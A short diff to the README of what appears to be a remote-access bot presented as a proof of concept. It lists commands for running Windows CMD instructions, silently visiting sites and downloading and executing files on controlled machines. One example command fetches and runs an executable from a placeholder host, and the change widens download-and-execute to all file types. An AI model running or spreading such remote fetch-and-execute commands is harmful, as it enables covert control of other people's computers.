@@ -14,7 +14,7 @@ This program was created as a Proof of Concept and it is not intended to be used
 # Features/Modules
 `cmd`  Windows CMD commands. Structured as `cmd command`
 
-`de` Download and execute. File is removed after execution. Structured as `de link`. May throw `Win5 Error` if the user is prompted for UAC.
+`de` Download and execute. File is removed after execution. Structured as `de link`. May throw `Win5 Error` if the user is prompted for UAC. Now supports all file types.
 
 `visit`  Silently visits a website. Structured as `visit link`
 
@@ -53,7 +53,6 @@ An example download+execute command would be:
 
 `!act DESKTOP-TEST de https://example.com/files/file.exe`
 
-It currently only supports exe files.
 
 # Creating the program.
 ### Coming soon: a builder.
